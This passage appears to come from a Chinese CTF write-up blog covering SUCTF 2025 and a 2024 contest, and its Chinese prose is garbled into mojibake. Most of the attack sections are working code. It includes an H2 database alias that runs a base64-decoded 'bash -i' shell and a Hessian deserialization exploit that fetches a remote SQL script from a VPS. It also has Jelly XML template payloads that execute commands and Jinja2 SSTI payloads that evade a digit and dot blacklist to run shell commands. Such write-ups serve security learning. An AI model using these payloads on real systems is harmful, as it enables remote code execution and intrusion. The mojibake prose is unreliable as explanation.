class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> ALIAS GSBPPP12 <span class="hljs-keyword">AS</span> $$ String shellexec(String cmd) throws java.io.IOException &#123; System.setSecurityManager(<span class="hljs-keyword">null</span>);java.util.Scanner s <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> java.util.Scanner(Runtime.getRuntime().<span class="hljs-keyword">exec</span>(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;); <span class="hljs-keyword">return</span> s.hasNext() ? s.next() : &quot;&quot;;  &#125;$$;<span class="hljs-keyword">CALL</span> GSBPPP12(<span class="hljs-string">&#x27;bash -c &#123;echo,aaa&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> org.noear.solon.data.util.UnpooledDataSource;<br><span class="hljs-keyword">import</span> java.net.URLEncoder;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        <span class="hljs-type">UnpooledDataSource</span> <span class="hljs-variable">unpooledDataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnpooledDataSource</span>(<span class="hljs-string">&quot;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://vps/poc.sql&#x27;&quot;</span>,<span class="hljs-string">&quot;GSBP&quot;</span>,<span class="hljs-string">&quot;GSBP&quot;</span>,<span class="hljs-string">&quot;org.h2.Driver&quot;</span>);<br>        unpooledDataSource.setLogWriter(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>        jsonObject.put(<span class="hljs-string">&quot;xx&quot;</span>, unpooledDataSource);<br><br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> Util.hessianSerialize(jsonObject);<br>        System.out.println(payload);<br>        System.out.println(URLEncoder.encode(payload, <span class="hljs-string">&quot;UTF-8&quot;</span>));<br>        <span class="hljs-comment">//Util.hessianDeserialize(payload);</span><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/01/15/SUCTF2025-WEB-Learning/image-20250120202000237.png" alt="image-20250120202000237"></p><p>ä¸‰æŠ˜å ï¼Œæ€ä¹ˆæŠ˜éƒ½æœ‰é¢ğŸ˜‹ğŸ˜‹ğŸ˜‹~~~</p><p><img src="/2025/01/15/SUCTF2025-WEB-Learning/image-20250120201505921.png" alt="image-20250120201505921"></p><h2 id="SU-PWN"><a href="#SU-PWN" class="headerlink" title="SU_PWN"></a>SU_PWN</h2><p>æ³¨æ„åˆ°<code>xalan</code>ä¾èµ–ï¼Œä¸”ç‰ˆæœ¬æ˜¯ <code>2.7.2</code> å­˜åœ¨å†å²æ¼æ´</p><p>æ‰¾åˆ°è¿™ä¸ªCVEï¼Œç½‘ä¸Šæœ‰ç°æˆpayload:</p><p>[Xalan-J XSLTæ•´æ•°æˆªæ–­æ¼æ´åˆ©ç”¨æ„é€ (CVE-2022-34169)å­¦ä¹ ä¸æ‰©å±•](<a href="https://alter1125.github.io/2023/02/19/Xalan-J">https://alter1125.github.io/2023/02/19/Xalan-J</a> XSLTæ•´æ•°æˆªæ–­æ¼æ´åˆ©ç”¨æ„é€ (CVE-2022-34169)å­¦ä¹ ä¸æ‰©å±•&#x2F;#CheckList)</p><p>ä½†æ˜¯ç›´æ¥æ‰“æŠ¥é”™null,æ‰¾åˆ°é—®é¢˜äº†,é»‘åå•ä¹‹åçš„é—®é¢˜åœ¨äºä»–æŠŠæˆ‘ä»¬ä¼ å…¥çš„æ–‡ä»¶åè¿›è¡Œäº†ä¿®æ”¹ä¸ºnull4ä½ï¼Œä½†æ˜¯é¡¹ç›®ç»™å‡ºçš„ç”Ÿæˆçš„æ–‡ä»¶éƒ½æ˜¯6ä½çš„ï¼Œ</p><ul><li>ç”±äºæ–‡ä»¶åä¹Ÿä¼šæ·»åŠ è‡³å¸¸é‡æ± ï¼Œä¸ºé¿å…å½±å“å¯¹å…¶ä»–å¸¸é‡ä½ç½®é€ æˆå˜åŠ¨ï¼Œé•¿åº¦éœ€ä¿è¯ä¸€è‡´(6)ï¼Œ<code>select -&gt; abcdef</code></li><li>è¿è¡Œå‰æœ€å¥½åˆ é™¤å·²ç”Ÿæˆçš„ <code>.class</code> æ–‡ä»¶(æ–‡ä»¶å†…å®¹å‘ç”Ÿå˜åŠ¨åˆ™ä¸ç”¨)</li></ul><p><a href="https://blog.noah.360.net/xalan-j-integer-truncation-reproduce-cve-2022-34169/">Xalan-J XSLTæ•´æ•°æˆªæ–­æ¼æ´åˆ©ç”¨æ„é€ (CVE-2022-34169)</a></p><p>ç›´æ¥ç”¨è¿™ä¸ªå¸ˆå‚…çš„githubé¡¹ç›®å°±èƒ½æ‰“ï¼Œæ³¨æ„è·å–æ–‡ä»¶åè®¾å®šä¸º6ä½ï¼Œfilenameæ˜¯å‚æ•°è·å–å•ç‹¬ä¼ å‚</p><p>æœ¬åœ°utf16ç›´æ¥ç»•è¿‡å‡ºäº†ï¼Œè¿œç¨‹ä¸å‡ºç½‘curl dnså¤–å¸¦æ²¡é™åˆ¶ã€‚æŒ‰ç…§å®˜æ–¹è¯´æ³•æ˜¯æœ¬æ¥æƒ³è®©æˆ‘ä»¬è‡ªå·±å¼„ä¸ªé‡æ‰“<code>xslt</code>çš„å†…å­˜é©¬ã€‚ã€‚ã€‚</p><p>åŠ ä¸Šä¸‹é¢è¿™ä¸ªutf-16è§£æå°±å¯ä»¥ç»•è¿‡é»‘åå•ï¼š</p><p><img src="/2025/01/15/SUCTF2025-WEB-Learning/image-20250124175516664.png" alt="image-20250124175516664"></p><p><img src="/2025/01/15/SUCTF2025-WEB-Learning/image-20250124175105749.png" alt="image-20250124175105749"></p><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>å¥½é¢˜å•Šå¥½é¢˜ã€‚å­¦åˆ°å¾ˆå¤šã€‚XCTFæ‰æ˜¯çœŸæ­£çš„å½’å®¿å§ã€‚</p><p>å‚è€ƒï¼š</p><p><a href="https://mp.weixin.qq.com/s/WAtpKN7lMzzr0pGUX07juA">2025 SUCTF wp</a></p><p><a href="https://quick-mascara-699.notion.site/Syclover-SUCTF-WP-177370c566a481ff9a01ebed7f0c87f8?pvs=25#6a5e720153af42299f8369cb52974b47">Syclover-SUCTF-WP</a></p><p><a href="https://www.yuque.com/yulate/sd2qe4/af7s0tsqlccm5ipe#8b446194">ez-micronaut</a></p><p><a href="https://www.yuque.com/yulate/sd2qe4/lck4awbn2y0gslbr">SU_ez_solon</a></p><p><a href="https://blog.0xfff.team/posts/suctf_2025_writeup/#su_easyk8s_on_aliyunreally-very-easy">SUCTF 2025 Writeup ::</a></p><p><a href="https://github.com/team-su/SUCTF-2025/tree/main/web/sujava/writeup">SUCTF-2025&#x2F;web&#x2F;sujava&#x2F;writeup at main Â· team-su&#x2F;SUCTF-2025 Â· GitHub</a></p><p><a href="https://www.yuque.com/pupi1/kd6gkq/dx488t7mc375m83o">SU_PWN</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¯”èµ›</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å›½åŸæ¯åˆèµ›2024-WEBå¤ç°</title>
    <link href="/2024/12/09/%E5%9B%BD%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B2024-WEB%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/12/09/%E5%9B%BD%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B2024-WEB%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å¥½ä¹…æ²¡æ‰“æ¯”èµ›äº†ï¼Œç½‘é¼æ¯è™½ç„¶å¯„äº†ï¼Œä½†æ˜¯å­¦åˆ°çš„ä¸œè¥¿è¿˜æ˜¯æœ‰å¾ˆå¤šã€‚è¿™æ¬¡éšä¾¿æ³¨å†Œäº†ä¸ªå·çœ‹äº†çœ‹ï¼Œé¢˜ç›®è¿˜æ˜¯ä¸é”™çš„ï¼Œäºæ˜¯å¤ç°ä¸€æ‰‹ã€‚</p><p>ä¸´è¿‘æœŸæœ«å‘¨äº†ï¼Œè¿™ç®—æ˜¯æˆ‘è¿™å­¦æœŸå€’æ•°ç¬¬äºŒæ¬¡å†™CTFçš„wpäº†å§ï¼Œæœ€åä¸€æ¬¡è¿˜æœ‰ä¸ªè€ƒå‰çš„è½¯ä»¶å®‰å…¨å›½èµ›çš„åˆèµ›æ‰“æ‰“ï¼Œç„¶åå°±æ˜¯ä¸€å †è€ƒè¯•ï¼ˆæ™•</p><h2 id="Easy-Jelly"><a href="#Easy-Jelly" class="headerlink" title="Easy Jelly"></a>Easy Jelly</h2><p>çœ‹åˆ°è¿™ä¸ªé¢˜ç›®å½“æ—¶æƒ³åˆ°çš„å°±æ˜¯æœ€è¿‘çš„ä¸€ä¸ªJellyæ¼æ´ï¼šCVE-2024-4879çš„SSTIæ¨¡æ¿æ³¨å…¥ã€‚</p><p>ä½†æ˜¯è¿™ä¸ªé¢˜å…¶å®ä¸æ˜¯è¿™æ ·çš„ã€‚è€Œä¸”è¿™é“é¢˜è¿˜å¯ä»¥ç›´æ¥XXEæ‰“éé¢„æœŸã€‚ã€‚ã€‚</p><p>å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://commons.apache.org/proper/commons-jelly/">https://commons.apache.org/proper/commons-jelly/</a></p><p>è¿™é‡Œå®˜æ–¹wpç»™å‡ºçš„è§£é‡Šå°±æ˜¯Jelly XMLå¼•æ“è§£æå¯¼è‡´çš„æ¼æ´ï¼Œåœ¨è¿‡æ»¤äº†ä¸€äº›å¸¸è§çš„Jellyæ ‡ç­¾çš„æƒ…å†µä¸‹ä»ç„¶å¯ä»¥ä½¿ç”¨Jexlè¡¨è¾¾å¼å®ç°RCEã€‚</p><p>æºç ä¹Ÿå¾ˆç®€å•ï¼Œç›´æ¥æƒ³åŠæ³•vpsä¸Šæ”¾ä¸ªåå¼¹shellçš„xmlç„¶åä¼ å‚uriå°±å¯ä»¥äº†ï¼š</p><img src="/2024/12/09/%E5%9B%BD%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B2024-WEB%E5%A4%8D%E7%8E%B0/image-20241209233047132.png" class="" title="image-20241209233047132"><p>ç”±äºå¯ä»¥ç›´æ¥vpsä¸Šæ”¾xmlï¼Œæ‰€ä»¥ä»–è¿™ä¸ªé»‘åå•å…¶å®æ˜¯å½¢åŒè™šè®¾ï¼ˆæ²¡æ‡‚ä¸ºå•¥è¦é»‘åå•ï¼‰ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Boolean <span class="hljs-title function_">check</span><span class="hljs-params">(String uri)</span> <span class="hljs-keyword">throws</span> IOException, ParserConfigurationException, SAXException &#123;<br>        <span class="hljs-type">DocumentBuilderFactory</span> <span class="hljs-variable">dbf</span> <span class="hljs-operator">=</span> DocumentBuilderFactory.newInstance();<br>        dbf.setNamespaceAware(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">DocumentBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> dbf.newDocumentBuilder();<br>        <span class="hljs-type">Document</span> <span class="hljs-variable">doc</span> <span class="hljs-operator">=</span> builder.parse(uri);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">tag1</span> <span class="hljs-operator">=</span> doc.getElementsByTagNameNS(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;expr&quot;</span>).getLength();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">tag2</span> <span class="hljs-operator">=</span> doc.getElementsByTagNameNS(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;import&quot;</span>).getLength();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">tag3</span> <span class="hljs-operator">=</span> doc.getElementsByTagNameNS(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;include&quot;</span>).getLength();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">tag4</span> <span class="hljs-operator">=</span> doc.getElementsByTagNameNS(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;invoke&quot;</span>).getLength();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">tag5</span> <span class="hljs-operator">=</span> doc.getElementsByTagNameNS(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;invokeStatic&quot;</span>).getLength();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">tag6</span> <span class="hljs-operator">=</span> doc.getElementsByTagNameNS(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;new&quot;</span>).getLength();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">tag7</span> <span class="hljs-operator">=</span> doc.getElementsByTagNameNS(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;parse&quot;</span>).getLength();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">tag8</span> <span class="hljs-operator">=</span> doc.getElementsByTagNameNS(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;set&quot;</span>).getLength();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">tag9</span> <span class="hljs-operator">=</span> doc.getElementsByTagNameNS(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;setProperties&quot;</span>).getLength();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">tag10</span> <span class="hljs-operator">=</span> doc.getElementsByTagNameNS(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;out&quot;</span>).getLength();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">tag11</span> <span class="hljs-operator">=</span> doc.getElementsByTagNameNS(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;useBean&quot;</span>).getLength();<br>        <span class="hljs-keyword">return</span> tag1 &lt;= <span class="hljs-number">0</span> &amp;&amp; tag2 &lt;= <span class="hljs-number">0</span> &amp;&amp; tag3 &lt;= <span class="hljs-number">0</span> &amp;&amp; tag4 &lt;= <span class="hljs-number">0</span> &amp;&amp; tag5 &lt;= <span class="hljs-number">0</span> &amp;&amp; tag6 &lt;= <span class="hljs-number">0</span> &amp;&amp; tag7 &lt;= <span class="hljs-number">0</span> &amp;&amp; tag8 &lt;= <span class="hljs-number">0</span> &amp;&amp; tag9 &lt;= <span class="hljs-number">0</span> &amp;&amp; tag10 &lt;= <span class="hljs-number">0</span> &amp;&amp; tag11 &lt;= <span class="hljs-number">0</span> ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>ç›´æ¥æ‰“payloadå°±å¯ä»¥äº†ï¼ˆç”¨çš„æœ¬åœ°dockerï¼Œå®˜æ–¹é¶æœºå¤ªé¸¡è‚‹äº†ï¼Œæ‰“åŠå¤©æ‰“ä¸é€šï¼Œè¿˜ä»¥ä¸ºä¸å‡ºç½‘ï¼‰ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">j:jelly</span> <span class="hljs-attr">xmlns:j</span>=<span class="hljs-string">&quot;jelly:core&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">j:getStatic</span> <span class="hljs-attr">var</span>=<span class="hljs-string">&quot;str&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">className</span>=<span class="hljs-string">&quot;org.apache.commons.jelly.servlet.JellyServlet&quot;</span> <span class="hljs-attr">field</span>=<span class="hljs-string">&quot;REQUEST&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">j:break</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;$&#123;str</span></span><br><span class="hljs-string"><span class="hljs-tag">.class</span></span><br><span class="hljs-string"><span class="hljs-tag">.forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance()</span></span><br><span class="hljs-string"><span class="hljs-tag">.getEngineByName(&#x27;js&#x27;)</span></span><br><span class="hljs-string"><span class="hljs-tag">.eval(&#x27;java.lang.Runtime.getRuntime().exec(<span class="hljs-symbol">&amp;quot;</span> RCE-Command<span class="hljs-symbol">&amp;quot;</span>)&#x27;)&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">j:break</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">j:jelly</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æˆ–è€…ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">j:jelly</span> <span class="hljs-attr">xmlns:j</span>=<span class="hljs-string">&quot;jelly:core&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">j:getStatic</span> <span class="hljs-attr">var</span>=<span class="hljs-string">&quot;str&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">className</span>=<span class="hljs-string">&quot;org.apache.commons.jelly.servlet.JellyServlet&quot;</span> <span class="hljs-attr">field</span>=<span class="hljs-string">&quot;REQUEST&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">j:whitespace</span>&gt;</span>$&#123;str<br>.class<br>.forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance()<br>.getEngineByName(&#x27;js&#x27;)<br>.eval(&#x27;java.lang.Runtime.getRuntime().exec(<span class="hljs-symbol">&amp;quot;</span> RCE-Command<span class="hljs-symbol">&amp;quot;</span>)&#x27;)&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">j:whitespace</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">j:jelly</span>&gt;</span><br></code></pre></td></tr></table></figure><img src="/2024/12/09/%E5%9B%BD%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B2024-WEB%E5%A4%8D%E7%8E%B0/image-20241209233207570.png" class="" title="image-20241209233207570"><p>Jellyåœ¨æ‰§è¡ŒJexlè¡¨è¾¾å¼ä¸Šéå¸¸çµæ´»ï¼Œå¯ä»¥åœ¨å®˜æ–¹æ–‡æ¡£ä¸­çœ‹åˆ°expræ ‡ç­¾çš„valueå±æ€§æ˜¯å…è®¸è®¡ç®—Jexlè¡¨è¾¾å¼çš„ï¼š</p><p><img src="/2024/12/09/%E5%9B%BD%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B2024-WEB%E5%A4%8D%E7%8E%B0/image-20241209233354352.png" alt="image-20241209233354352"></p><p>å…¶æ‰§è¡Œé€»è¾‘ä½äº<code>org.apache.commons.jelly.tags.core.ExprTag#doTag</code>æ–¹æ³•ï¼š</p><p><img src="/2024/12/09/%E5%9B%BD%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B2024-WEB%E5%A4%8D%E7%8E%B0/image-20241209233447390.png" alt="image-20241209233447390"></p><p>å¦‚æœä½ å»ç¿»çœ‹<code>CoreTagLibrary</code>ç±»ï¼Œä¼šå‘ç°outæ ‡ç­¾çš„åŒæ ·ä¼šåˆ°<code>org.apache.commons.jelly.tags.core.ExprTag#doTag</code>æ–¹æ³•ä¸‹å¤„ç†</p><p><img src="/2024/12/09/%E5%9B%BD%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B2024-WEB%E5%A4%8D%E7%8E%B0/image-20241209233629735.png" alt="image-20241209233629735"></p><p>å®˜æ–¹ç»™äº†ä¸ªæ€è·¯ï¼Œå¯ä»¥è·Ÿä¸€è·Ÿï¼š</p><p><img src="/2024/12/09/%E5%9B%BD%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B2024-WEB%E5%A4%8D%E7%8E%B0/image-20241209233711981.png" alt="image-20241209233711981"></p><h2 id="Ez-Gallery"><a href="#Ez-Gallery" class="headerlink" title="Ez_Gallery"></a>Ez_Gallery</h2><p>å¼±å¯†ç admin&#x2F;123456ï¼ŒéªŒè¯ç çº¯æ•°å­—ï¼Œå¦‚æœè¦è¯†åˆ«éªŒè¯ç çˆ†å¯†ç å¯ä»¥å®‰bpçš„æ’ä»¶ï¼Œä¸è¿‡å¤šè¯´äº†ã€‚</p><p>ç„¶åè¿›å»æœ‰ä¸ªè¯»æ–‡ä»¶çš„è·¯ç”±ï¼Œæ˜¾ç„¶å¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–ï¼Œ<code>/proc/self/cmdlin</code>eæ˜¯å¯ä»¥çœ‹åˆ°app.pyçš„ä½ç½®çš„ï¼Œç„¶åç›´æ¥è¯»<code>/app/app.py</code>è·å¾—æºç ã€‚</p><p>å…¶ä»–çš„æ²¡å•¥å¥½çœ‹çš„,ä¸»è¦æ˜¯è¿™é‡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">shell_view</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">if</span> request.session.get(<span class="hljs-string">&#x27;username&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&quot;è¯·å…ˆç™»å½•&quot;</span>, status=<span class="hljs-number">403</span>)<br><br>    expression = request.GET.get(<span class="hljs-string">&#x27;shellcmd&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    blacklist_patterns = [<span class="hljs-string">r&#x27;.*length.*&#x27;</span>,<span class="hljs-string">r&#x27;.*count.*&#x27;</span>,<span class="hljs-string">r&#x27;.*[0-9].*&#x27;</span>,<span class="hljs-string">r&#x27;.*\..*&#x27;</span>,<span class="hljs-string">r&#x27;.*soft.*&#x27;</span>,<span class="hljs-string">r&#x27;.*%.*&#x27;</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(re.search(pattern, expression) <span class="hljs-keyword">for</span> pattern <span class="hljs-keyword">in</span> blacklist_patterns):<br>        <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&#x27;wafwafwaf&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        result = jinja2.Environment(loader=jinja2.BaseLoader()).from_string(expression).render(&#123;<span class="hljs-string">&quot;request&quot;</span>: request&#125;)<br>        <span class="hljs-keyword">if</span> result != <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&#x27;success&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&#x27;error&#x27;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&#x27;error&#x27;</span>)<br></code></pre></td></tr></table></figure><p>ä¸€çœ¼SSTIï¼Œä½†banäº†æ•°å­—å’Œç‚¹å·æ‰æ˜¯æœ€ä¼¤çš„ï¼Œå¾ˆå¤šå‘½ä»¤ç»™banäº†ï¼Œå†™å†…å­˜é©¬ä¹Ÿä¸å¥½å†™ã€‚</p><p>ä½†æ˜¯æ–¹æ³•æ€»æ¯”å›°éš¾å¤šï¼Œè¿™é‡Œä¸å†™æˆ‘é‚£ä¸ªçƒ‚æ–¹æ³•äº†ï¼Œåˆé•¿åˆéš¾çœ‹ã€‚ã€‚ã€‚è€Œä¸”è¿™é‡Œæ²¡å›æ˜¾ï¼Œä¹Ÿåœ¨è€ƒè™‘SSTIç›²æ³¨çš„æ€è·¯ã€‚</p><p>å®˜æ–¹wpç»™å‡ºçš„æ˜¯é’©å­å‡½æ•°çš„è§£æ³•ï¼š</p><p>è¿™é‡Œå°è¯•å†…å­˜é©¬ï¼Œä½†æ˜¯æ·»åŠ è·¯ç”±çš„config å˜é‡æ˜¯å±€éƒ¨å˜é‡ï¼Œæ‰€ä»¥è€ƒè™‘å…¶ä»–å’Œ config æ— å…³çš„é’©å­å‡½æ•°ï¼Œå‚è€ƒï¼š<a href="https://docs.pylonsproject.org/projects/pyramid/en/1.4-branch/narr/hooks.html">https://docs.pylonsproject.org/projects/pyramid/en/1.4-branch/narr/hooks.html</a></p><p><img src="/2024/12/09/%E5%9B%BD%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B2024-WEB%E5%A4%8D%E7%8E%B0/image-20241209234209849.png" alt="image-20241209234209849"></p><p>åˆ©ç”¨ <code>request.add_response_callback</code> é’©å­å‡½æ•°è¿›è¡Œå›æ˜¾ï¼Œæ„é€ ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;cycler.__init__.__globals__.__builtins__[<span class="hljs-string">&#x27;exec&#x27;</span>](<span class="hljs-string">&quot;request.add_response_callback(lambda request, response: setattr(response,&#x27;text&#x27;, __import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()))&quot;</span>,&#123;<span class="hljs-string">&#x27;request&#x27;</span>: request&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><p>ç”¨<code>getattr</code>ç»•ä¸€ä¸‹ç‚¹å·ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;cycler[<span class="hljs-string">&#x27;__init__&#x27;</span>][<span class="hljs-string">&#x27;__globals__&#x27;</span>][<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;exec&#x27;</span>](<span class="hljs-string">&quot;getattr(request,&#x27;add_response_callback&#x27;)(lambda request,response:setattr(response, &#x27;text&#x27;, getattr(getattr(__import__(&#x27;os&#x27;),&#x27;popen&#x27;)(&#x27;whoami&#x27;),&#x27;read&#x27;)()))&quot;</span>,&#123;<span class="hljs-string">&#x27;request&#x27;</span>: request&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/12/09/%E5%9B%BD%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B2024-WEB%E5%A4%8D%E7%8E%B0/image-20241209234305873.png" alt="image-20241209234305873"></p><p>è¿˜å¯ä»¥ç”¨å›æ˜¾å¤´çš„æ–¹æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;cycler[<span class="hljs-string">&#x27;__init__&#x27;</span>][<span class="hljs-string">&#x27;__globals__&#x27;</span>][<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;setattr&#x27;</span>](cycler[<span class="hljs-string">&#x27;__init__&#x27;</span>][<span class="hljs-string">&#x27;__globals__&#x27;</span>][<span 